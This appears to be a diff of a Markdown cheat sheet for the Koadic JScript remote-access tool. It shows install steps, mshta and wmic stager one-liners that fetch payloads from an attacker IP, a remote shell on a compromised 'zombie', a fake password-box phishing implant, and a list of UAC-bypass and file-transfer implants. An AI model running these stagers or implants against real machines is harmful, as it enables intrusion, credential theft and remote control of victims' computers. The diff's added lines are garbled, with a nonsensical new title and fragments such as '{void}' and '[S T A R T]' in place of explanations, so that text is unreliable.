@@ -1,9 +1,6 @@
-# Koadic C3 COM Command & Control - JScript RAT
-
-> Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire.
-
+# Kampgrounds of America, Dictionary (Koadic) C3 COM Command & Control - JScript RAT
+> Windows post-exploitation rootkit. I.E. Meterpreter, Powershell Empire etc.) All Rights Reserved.
 ## Installation
-
 ```powershell
 git clone https://github.com/zerosum0x0/koadic
 git submodule init
@@ -11,31 +8,27 @@ git submodule update
 pip2.7 install -r requirements.txt --user
 python2.7 koadic
 ```
-
 ## Set a listener
-
 ```powershell
 use stager/js/mshta
 set LHOST 192.168.1.19
 set SRVPORT 4444
 run
-
 [>] mshta http://192.168.1.19:4444/6DX7f
 ```
-
+{void}
 ```powershell
 use stager/js/wmic
 set LHOST 192.168.1.19
 set SRVPORT 4444
 run
-
 [>] wmic os get /FORMAT:"http://192.168.1.19:4444/lQGx5.xsl"
 ```
-
 ### Stagers
-
-Stagers hook target zombies and allow you to use implants.
-
+[>] [TARGET] zombie.h 
+[>] [ALLOW] (You) 
+[!] use.imps
+..
 Module | Description
 --------|------------
 stager/js/mshta | serves payloads using MSHTA.exe HTML Applications
@@ -43,14 +36,9 @@ stager/js/regsvr | serves payloads using regsvr32.exe COM+ scriptlets
 stager/js/wmic | serves payloads using WMIC XSL
 stager/js/rundll32_js | serves payloads using rundll32.exe
 stager/js/disk | serves payloads using files on disk
-
-
-
 ## List zombies and interact with them
-
 ```powershell
 (koadic: sta/js/wmic)$ zombies
-
         ID   IP              STATUS  LAST SEEN
         ---  ---------       ------- ------------
         0    192.168.1.30    Alive   2018-10-04 17:07:12
@@ -66,9 +54,7 @@ stager/js/disk | serves payloads using files on disk
         Elevated:               No
         [...]
 ```
-
-Interact with `zombies zombie_id`, get a shell with `cmdshell zombie_id`.
-
+>Interact with `zombies zombie_id`, get a shell with `cmdshell zombie_id`.
 ```powershell
 [koadic: ZOMBIE 0 (192.168.1.30) - C:\Users\CrashWin]> whoami
 [*] Zombie 0: Job 1 (implant/manage/exec_cmd) created.
@@ -76,11 +62,8 @@ Interact with `zombies zombie_id`, get a shell with `cmdshell zombie_id`.
 Result for `cd C:\Users\CrashWin & whoami`:
 desktop-68ura9u\crashwin
 ```
-
 ## Use an implant
-
 Select an implant with `use module`, then fill the `info` with `set INFO value`, finally start the module with `run`.
-
 ```powershell
 (koadic: sta/js/mshta)$ use implant/phish/password_box
 (koadic: imp/phi/password_box)$ set ZOMBIE 1
@@ -88,11 +71,9 @@ Select an implant with `use module`, then fill the `info` with `set INFO value`,
 Input contents:
 MyStrongPassword123!
 ```
-
 ### Implants
-
-Implants start jobs on zombies.
-
+>job.imp
+[S T A R T]
 Module | Description
 --------|------------
 implant/elevate/bypassuac_eventvwr | Uses enigma0x3's eventvwr.exe exploit to bypass UAC on Windows 7, 8, and 10.
@@ -116,8 +97,6 @@ implant/scan/tcp | Uses HTTP to scan open TCP ports on the target zombie LAN.
 implant/utils/download_file | Downloads a file from the target zombie.
 implant/utils/multi_module | Run a number of implants in succession.
 implant/utils/upload_file | Uploads a file from the listening server to the target zombies.
-
 ## References
-
 - [Pentestlab - koadic](https://pentestlab.blog/tag/koadic/)
 - [zerosum0x0 Github - koadic](https://github.com/zerosum0x0/koadic)
